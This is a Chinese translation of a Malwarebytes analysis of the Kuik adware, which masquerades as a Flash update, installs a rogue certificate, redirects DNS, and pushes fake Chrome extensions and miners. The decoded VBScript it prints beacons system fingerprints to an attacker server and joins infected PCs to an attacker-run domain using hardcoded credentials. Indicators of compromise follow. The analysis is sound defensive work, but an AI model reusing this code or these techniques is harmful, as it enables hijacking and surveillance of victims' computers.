> 原文链接: https://www.anquanke.com//post/id/146458 


# 针对Kuik恶意广告软件的分析


                                阅读量   
                                **99336**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://blog.malwarebytes.com/
                                <br>原文地址：[https://blog.malwarebytes.com/threat-analysis/2018/05/kuik-simple-yet-annoying-piece-adware/](https://blog.malwarebytes.com/threat-analysis/2018/05/kuik-simple-yet-annoying-piece-adware/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0193e236cbf2e3969a.jpg)](https://p3.ssl.qhimg.com/t0193e236cbf2e3969a.jpg)

## 写在前面的话

一些恶意软件可能编写很简单，但却可能带给用户巨大的痛苦，比如今天我们要讲的Kuik广告软件，情况就是这样。作者使用这种不寻常的技术将谷歌浏览器扩展程序和挖矿应用程序推送给受害者。在此博客中，我们将提供此广告软件的技术分析和自定义删除说明。‘’



## 技术说明

### <a class="reference-link" name="%E7%AC%AC1%E9%98%B6%E6%AE%B5%20-%20.NET%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F"></a>第1阶段 – .NET安装程序

[0ba20fee958b88c48f3371ec8d8a8e5d](https://www.virustotal.com/#/file/b9323268bf81778329b8316dec8f093fe71104f16921a1c9358f7ba69dd52686/details)

第一阶段是用.NET编写的，它会模仿Adobe Flash Player的图标(这是捆绑软件的典型特征)，并提示更新软件组件，但却将自己的代码添加到原始安装程序中。

[![](https://p0.ssl.qhimg.com/t01fc28657bb56cc4d5.png)](https://p0.ssl.qhimg.com/t01fc28657bb56cc4d5.png)

用dotNet反编译器（即dnSpy）打开后，我们发现该项目的原始名称是 `WWVaper`。

[![](https://p3.ssl.qhimg.com/t0191974b1746043bb2.png)](https://p3.ssl.qhimg.com/t0191974b1746043bb2.png)它有三个内部资源：
- 证书（svr.crt）
- 一个合法的Flash（decoy）
- 下一阶段组件（upp.exe）
[![](https://p5.ssl.qhimg.com/t014eaa2acf945816dd.png)](https://p5.ssl.qhimg.com/t014eaa2acf945816dd.png)<br>
证书：

> <p>——- BEGIN CERTIFICATE ——-<br>
MIIEZjCCA06gAwIBAgIJAPywkVD7m / 9XMA0GCSqGSIb3DQEBCwUAMHMxCzAJBgNV<br>
BAYTAlVTMQswCQYDVQQIDAJOWTERMA8GA1UEBwwITmV3IFlvcmsxFTATBgNVBAoM<br>
DEV4YW1wbGUsIExMQzEMMAoGA1UEAwwDYWxsMR8wHQYJKoZIhvcNAQkBFhB0ZXN0<br>
QGV4YW1wbGUuY29tMB4XDTE4MDIxNjIyMjA0M1oXDTE5MDIxNjIyMjA0M1owczEL<br>
MAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMREwDwYDVQQHDAhOZXcgWW9yazEVMBMG<br>
A1UECgwMRXhhbXBsZSwgTExDMQwwCgYDVQQDDANhbGwxHzAdBgkqhkiG9w0BCQEW<br>
EHRlc3RAZXhhbXBsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB<br>
AQDMohZZUrsJOqXS1 / eTpGGOMDxEE + YmRLmSU5h / K4tmnkr7Tv9cukICp / Xxnrci<br>
5ONLdqgQFH1xLxLa6Xo + 2X075NS0VjfMPx9WvYPSZ / T7uQQhb8Mc + ojjNoHK0JbD<br>
oPjiuiGTLllq1AQ34kvQa6k8E7GPjSdrQnPF55 + aWAdPSIDcdqxMt1uFOcF0DY4y<br>
vHNpFw1xsjpYuvw1 / MvwITr3A + PdKN9TIMzDgbXTZEtc7rWDah4HtIYSJZ2xwIcH<br>
qp6xU9FypSV6JnbITlv4gZkUuI2HeiNpSGGd55KOtk5pDhuGeNfLGor6eWcSG6eX<br>
N6erGBkM7VTfJ5yM9Pxfcu + hAgMBAAGjgfwwgfkwHQYDVR0OBBYEFCZDbmCp6xnU<br>
3F / U3InMEiuduPEMMB8GA1UdIwQYMBaAFCZDbmCp6xnU3F / U3InMEiuduPEMMAkG<br>
A1UdEwQCMAAwCwYDVR0PBAQDAgWgMHEGA1UdEQRqMGiCCXlhaG9vLmNvbYINd3d3<br>
LnlhaG9vLmNvbYIKZ29vZ2xlLmNvbYIOd3d3Lmdvb2dsZS5jb22CCWdvb2dsZS5t<br>
ZYINd3d3Lmdvb2dsZS5tZYIIYmluZy5jb22CDHd3dy5iaW5nLmNvbTAsBglghkgB<br>
hvhCAQ0EHxYdT3BlblNTTCBHZW5lcmF0ZWQgQ2VydGlmaWNhdGUwDQYJKoZIhvcN<br>
AQELBQADggEBAMQm1OHLdcYvQK6aMPgYdOozkDT20DuJ6NZD1Frljjex7NzB7nVm<br>
AC + 3h1huSyqxYGbJQ8J3wLOYRZH + N5GOZUvjwrU + NY5KurWbMj6USMfsWfnnSXQi<br>
0ADyjYZqtPMmIaIK86yPx4t + 3mA8VX5nDRurjKoprTKwaQpxKksZ0kkpitN1epZX<br>
2g1YJAnjnq / 9Ilt3MOCEpoCnUz5E + bgQO9AS9ZQqNryuGFfzjgXxLbYBbyDVknZ0<br>
2zz4Zzkm2QBCIGi5jigz7VmwmcpIhJPH9QKlCw5Dx + F3mepR01UMaiwEBDGIeSWX</p>
<ul>
<li>joBVMKdqhFu9zChlN0dW0hbViIm + gDYsCQ =<br>
——- END CERTIFICATE ——-</li>
</ul>

证书详情：

[![](https://p4.ssl.qhimg.com/t01c673f30e80b90d62.png)](https://p4.ssl.qhimg.com/t01c673f30e80b90d62.png)

证书指向yahoo.com的DNS名称。但是，认证路径无效：

[![](https://p0.ssl.qhimg.com/t01d3d03295c3dc5d0f.png)](https://p0.ssl.qhimg.com/t01d3d03295c3dc5d0f.png)

.NET安装程序负责安装恶意证书和其他组件。首先，它枚举网络接口并将收集的IP添加到列表中：

[![](https://p0.ssl.qhimg.com/t011dd209479a6e0d98.png)](https://p0.ssl.qhimg.com/t011dd209479a6e0d98.png)

然后，它将新的IP作为DNS（18.219.162.248）添加到收集的接口。它还安装自己的证书（svr.crt）：

[![](https://p2.ssl.qhimg.com/t010202381c43bfcaa7.png)](https://p2.ssl.qhimg.com/t010202381c43bfcaa7.png)

### <a class="reference-link" name="%E7%AC%AC2%E9%98%B6%E6%AE%B5%20-%20upp.exe"></a>第2阶段 – upp.exe

[3a13b73f823f081bcdc57ea8cc3140ac](https://www.virustotal.com/#/file/990c019319fc18dca473ac432cdf4c36944b0bce1a447e85ace819300903a79e/details)<br>
此应用程序是一个未混淆的安装程序包。在里面，我们找到了一个cabinet文件：

[![](https://p2.ssl.qhimg.com/t0171194f0496d7d7f7.png)](https://p2.ssl.qhimg.com/t0171194f0496d7d7f7.png)<br>
它包含要删除的其他模块：

[![](https://p5.ssl.qhimg.com/t014cf105136b2cbb9a.png)](https://p5.ssl.qhimg.com/t014cf105136b2cbb9a.png)<br>
应用程序`“install.exe”`以`“setup.bat”`作为参数进行部署。

[![](https://p2.ssl.qhimg.com/t01746adfc46c3c18e8.png)](https://p2.ssl.qhimg.com/t01746adfc46c3c18e8.png)

### <a class="reference-link" name="%E7%AC%AC3%E9%98%B6%E6%AE%B5%20-%20%E4%BB%8Ecabinet%E4%B8%AD%E5%8F%96%E5%87%BA%E7%BB%84%E4%BB%B6"></a>第3阶段 – 从cabinet中取出组件

应用程序`install.exe`是基本的。它的唯一作用是在elevated 模式下运行下一个进程。在下面，你可以看到它的主要功能：

[![](https://p0.ssl.qhimg.com/t018496f0ab824471c9.png)](https://p0.ssl.qhimg.com/t018496f0ab824471c9.png)

脚本`setup.bat`部署了另一个名为`SqadU9FBEV.bat`的组件：

[![](https://p5.ssl.qhimg.com/t01da6014b92a92ac9c.png)](https://p5.ssl.qhimg.com/t01da6014b92a92ac9c.png)<br>
它通过`ping 127.0.0.1`来延迟执行。然后，它运行第二个编码脚本，为其提供一个活动ID作为参数：

[![](https://p0.ssl.qhimg.com/t01e424e6cae31f106a.png)](https://p0.ssl.qhimg.com/t01e424e6cae31f106a.png)下一个部署的元素是一个编码的VBS脚本：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01346fe45107e373f1.png)<br>
在解码之后（用 这个解码器），我们看到了这个脚本：`NYkjVVXepl.vbs`。我们还看到它将系统和信标指纹到服务器：

```
Set SystemSet = GetObject("winmgmts:").InstancesOf ("Win32_OperatingSystem") 
for each System in SystemSet 
  winVer = System.Caption 
next
Function trackEvent(eventName, extraData)
  Set tracking = CreateObject("MSXML2.XMLHTTP")
  tracking.open "GET", "http://eventz.win:13463/trk?event=" &amp; eventName &amp; "&amp;computer=" &amp; UUID &amp; "&amp;windows-version=" &amp; winVer &amp; "&amp;error=" &amp; err.Number &amp; ";" &amp; err.Description &amp; ";" &amp; err.Source &amp; ";" &amp; extraData &amp; "&amp;campaign=qavriknzkk&amp;channel=" &amp; WScript.Arguments.Item(0), False
  tracking.send
  err.clear
End Function
```

这个片段是将受感染的计算机添加到域：

```
SET objNetwork = CREATEOBJECT("WScript.Network")
strComputer = objNetwork.ComputerName
SET objComputer = GetObject("winmgmts:" &amp; "`{`impersonationLevel=Impersonate,authenticationLevel=Pkt`}`!\" &amp; strComputer &amp; "rootcimv2:Win32_ComputerSystem.Name='" &amp; strComputer &amp; "'")
ReturnValue = objComputer.JoinDomainOrWorkGroup("kuikdelivery.com", "4sdOwt7b7L1vAKR6U7", "kuikdelivery.comadministrator", "OU=" &amp; WScript.Arguments.Item(0) &amp; ",DC=kuikdelivery,DC=com", JOIN_DOMAIN + ACCT_CREATE + DOMAIN_JOIN_IF_JOINED + JOIN_UNSECURE)
If (ReturnValue  0) Or (err.number  0) Then
  trackEvent "join-domain-failed", ReturnValue
  WScript.Quit 1
Else
  trackEvent "join-domain-success", Null
  WScript.Quit 0
End IF

```



## Payloads

这个程序使用了一系列的payloads，但是这个伪造的Chrome扩展似乎特别受欢迎。此外，还有一些挖矿程序正在服务：

[![](https://p1.ssl.qhimg.com/t016f496564c3b7ff38.png)](https://p1.ssl.qhimg.com/t016f496564c3b7ff38.png)



## 删除

Malwarebytes 用户（版本3.x）可以通过运行全面扫描从系统中移除此威胁。删除包括取消加入恶意域控制器以将您的机器恢复到其原始状态。

### <a class="reference-link" name="%E5%A6%A5%E5%8D%8F%E6%8C%87%E6%A0%87"></a>妥协指标

<a class="reference-link" name="Kuik"></a>**Kuik**

```
b9323268bf81778329b8316dec8f093fe71104f16921a1c9358f7ba69dd52686 
990c019319fc18dca473ac432cdf4c36944b0bce1a447e85ace819300903a79e
```

<a class="reference-link" name="Chrome%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F"></a>**Chrome扩展程序**

```
d-and-h[.]com/fljlngkbcebmlpdlojnndahifaocnipb.crx
d-and-h[.]com/123.crx
d-and-h[.]com/jpfhjoeaokamkacafjdjbjllgkfkakca.crx
d-and-h[.]com/mmemdlochnielijcfpmgiffgkpehgimj.crx
kuikdelivery[.]com/emhifpfmcmoghejbfcbnknjjpifkmddc.crx
tripan[.]me/kdobijehckphahlmkohehaciojbpmdbp.crx
```

<a class="reference-link" name="payloads"></a>**payloads**

```
92996D9E7275006AB6E59CF4676ACBB2B4C0E0DF59011347CE207B219CB2B751 
33D86ABF26EFCDBD673DA5448C958863F384F4E3E678057D6FAB735968501268 
7889CB16DB3922BEEFB7310B832AE0EF60736843F4AD9FB2BFE9D8B05E48BECD 
761D62A22AE73307C679B096030BF0EEC93555E13DC820931519183CAA9F1B2A 
871AD057247C023F68768724EBF23D00EF842F0B51​​0A3ACE544A8948AE775712
```
